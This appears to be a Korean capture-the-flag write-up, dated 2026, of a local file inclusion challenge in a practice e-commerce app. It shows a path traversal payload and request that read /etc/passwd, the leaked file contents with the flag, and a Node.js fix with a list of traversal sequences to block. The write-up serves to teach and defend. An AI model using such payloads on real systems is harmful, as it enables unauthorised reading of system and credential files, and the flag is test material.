+++
title = "VulnABLE CTF [LUXORA] Write-up: LFI 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "LFI", "Path Traversal", "Bronze", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: LFI 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (LFI / Path Traversal)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/lfi/bronze`
- **목표**: 애플리케이션이 로컬 파일을 읽어오는 기능에 존재하는 입력값 검증 부재를 악용하여, 디렉터리 탐색(Path Traversal) 공격을 수행하고 서버의 중요 시스템 파일인 `/etc/passwd` 를 읽어내어 플래그를 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/lfi/bronze` 페이지는 다국어 지원이나 템플릿 렌더링을 위해 서버 내의 특정 텍스트 파일(예: `en.txt`, `kr.txt` 등)을 불러와서 화면에 보여주는 기능입니다.

**[정상 요청 URL]**
```http
GET /lfi/bronze?file=welcome.txt HTTP/1.1
Host: localhost:3000
```

**[정상 서버 응답]**
```html
<div class="content">
  Welcome to LUXORA, the most premium e-commerce platform!
</div>
```

**[해커의 사고 과정]**
1. URL 파라미터 `file=welcome.txt`를 보니, 서버가 내가 입력한 파일 이름을 그대로 운영체제의 파일 시스템에 전달하여 읽어(Read)오고 있다.
2. 백엔드 코드가 대략 `fs.readFileSync("/var/www/html/templates/" + req.query.file)` 처럼 생겼을 것이다.
3. 그렇다면 내가 `file` 파라미터에 `../../../../etc/passwd` 같은 **상위 디렉터리 이동 문자(`../`)**를 넣는다면?
4. 지정된 `templates` 폴더를 벗어나(Path Traversal) 리눅스 시스템의 가장 민감한 파일 중 하나인 `/etc/passwd` 파일을 읽어낼 수 있을 것이다! (Local File Inclusion)

---

## 💥 2. 취약점 식별 및 페이로드 조립 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(file=../../../../etc/passwd)--> [ Web Server ]
                                                |-- include(../../../../etc/passwd)
<-- Contents of /etc/passwd --------------------|
```


리눅스 시스템에서 `/etc/passwd` 파일은 사용자 계정 정보가 들어있는 대표적인 파일로, LFI 취약점을 검증할 때 전 세계 해커들이 가장 먼저 찔러보는 "국룰" 타겟입니다.

### 💡 페이로드 설계
현재 웹 서버의 작업 디렉터리 깊이를 정확히 알 수 없으므로, 상위 디렉터리로 이동하는 `../` 를 충분히 많이(보통 5~10개) 입력합니다. 리눅스에서는 최상위 루트(`/`) 도달 후 추가적인 `../` 명령은 무시되므로 안전하게 루트 디렉터리에 도달할 수 있습니다.

**[주입할 페이로드]**
```text
../../../../../../../../etc/passwd
```

---

## 🚀 3. 공격 수행 및 결과 확인

브라우저의 주소창이나 Burp Suite를 통해 조작된 페이로드를 서버로 전송합니다.

```http
GET /lfi/bronze?file=../../../../../../../../etc/passwd HTTP/1.1
Host: localhost:3000
```

### 🔍 조작된 서버의 응답
서버는 아무런 필터링 없이 입력받은 경로의 파일을 읽어 브라우저로 렌더링해 버립니다!

```html
<div class="content">
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  ...
  luxora_app:x:1001:1001::/home/luxora_app:/bin/bash
  FLAG{LFI_🥉_BASIC_TRAVERSAL_A1B2C3}:x:9999:9999::/var/www:/bin/false
</div>
```

`/etc/passwd` 파일의 내용이 화면에 쏟아지며, 그 사이에 관리자가 숨겨둔 플래그가 보입니다!

---

## 🚩 4. 롸잇업 결론 및 플래그

파일을 동적으로 읽어오는 기능에서 경로 구분자(`../`)에 대한 검증을 누락하는 가장 기초적이고 파괴적인 Path Traversal(LFI) 공격을 성공시켰습니다.

**🔥 획득한 플래그:**
`FLAG{LFI_🥉_BASIC_TRAVERSAL_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자의 입력을 파일 경로(File Path)에 직접 결합하여 운영체제 API(`fs.readFile`, `include()`, `fopen()` 등)에 넘긴 것이 원인입니다.

* **안전한 패치 가이드 (경로 검증 및 정규화)**
1. **상대 경로 치환 문자 차단**: 사용자 입력에서 `../`, `..\\`, `%2e%2e%2f` 와 같은 디렉터리 순회 기호를 완벽하게 차단하거나 에러 처리해야 합니다.
2. **경로 정규화 후 베이스 디렉터리 검사 (권장)**: Node.js의 경우 `path.resolve()`나 `path.normalize()`를 이용해 최종 절대 경로를 계산한 뒤, 그 경로가 반드시 허용된 `BASE_DIR` 내부에 위치하는지 `startsWith()` 로 검증해야 합니다.

```javascript
const path = require('path');
const BASE_DIR = '/var/www/html/templates/';

// 사용자가 입력한 경로와 BASE_DIR을 합쳐 최종 절대 경로 계산
const requestedPath = path.resolve(BASE_DIR, req.query.file);

// 최종 경로가 BASE_DIR로 시작하지 않으면 차단 (디렉터리 이탈 방지)
if (!requestedPath.startsWith(BASE_DIR)) {
    return res.status(403).send("Access Denied: Path Traversal Detected");
}

// 검증 통과 후 파일 읽기
const content = fs.readFileSync(requestedPath, 'utf8');
```
이러한 방어로직을 적용하면, 해커가 `../../etc/passwd` 를 입력하더라도 최종 경로가 `/etc/passwd` 로 계산되고, 이는 `BASE_DIR` 로 시작하지 않으므로 즉시 403 Forbidden 에러로 차단됩니다.